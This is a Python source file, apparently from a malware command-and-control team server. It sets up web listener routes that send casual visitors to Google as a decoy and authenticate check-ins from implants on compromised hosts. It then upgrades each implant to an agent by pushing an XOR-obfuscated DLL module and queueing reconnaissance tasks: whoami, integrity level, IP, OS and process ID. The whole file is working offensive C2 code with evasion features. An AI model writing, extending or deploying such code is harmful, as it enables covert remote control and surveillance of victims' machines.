import json
import os
import hashlib

from aiohttp import web
from connect.convert import string_to_base64, xor_base64
from connect.output import display
from connect.server.models import AgentModel, get_session, ImplantModel, TaskModel


class ListenerRoutes:

    def __init__(self, aiohttp_app, sio_team_server, task_manager):
        self.sio_team_server = sio_team_server
        self.aiohttp_app = aiohttp_app
        self.aiohttp_app.router.add_get(r'/{route:[^\/socket.io\/].*}', self.dummy_route)
        self.aiohttp_app.router.add_post('/{route:.*}', self.check_in)
        self.task_manager = task_manager

    @staticmethod
    async def dummy_route(request):
        route = request.match_info.get('route')
        display(f'{request.remote} requested /{route} redirecting them to google', 'INFORMATION')
        return web.HTTPFound("https://www.google.com")

    async def check_in(self, request):
        try:
            batch_response = await request.json()
        except json.decoder.JSONDecodeError:
            #data = request.get_data().decode('utf-8')
            #display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
            return web.HTTPFound("https://www.google.com")

        if isinstance(batch_response, dict):
            with get_session() as session:
                if 'id' not in batch_response:
                    return web.HTTPFound("https://www.google.com")
                implant_key = batch_response['id']
                await self.sio_team_server.emit('information', f'Implant authenticating with {implant_key}')
                implant = session.query(ImplantModel).filter_by(key=implant_key).first()
                if not implant:
                    await self.sio_team_server.emit('error', f'Failed to authenticate Implant with {implant_key}')
                    return web.HTTPFound("https://www.google.com")
                await self.sio_team_server.emit('success', f'Successfully authenticated Implant with {implant_key}')
                response = await self.create_agent(implant, session)
                return web.Response(text=response)
        batch_request = await self.task_manager.parse_batch_response(batch_response)
        return web.json_response(batch_request)

    async def create_agent(self, implant, session):
        agent = AgentModel(implant=implant)
        module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
        module_md5 = hashlib.md5(module_bytes).hexdigest()
        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{module_md5}'
        module, key = xor_base64(module_bytes)
        parameters = ','.join([module, key])
        load_task = TaskModel(agent=agent, method='load', type=-1, parameters=parameters, misc='')
        whoami_task = TaskModel(agent=agent, method='whoami', type=-1, parameters='', misc='')
        integrity_task = TaskModel(agent=agent, method='integrity', type=-1, parameters='', misc='')
        ip_task = TaskModel(agent=agent, method='ip', type=-1, parameters='', misc='')
        os_task = TaskModel(agent=agent, method='os', type=-1, parameters='', misc='')
        pid_task = TaskModel(agent=agent, method='pid', type=-1, parameters='', misc='')
        session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
        session.commit()
        await self.sio_team_server.emit('information', f'Attempting to upgrade Implant to Agent {agent.id}')
        return str(agent.check_in_task_id)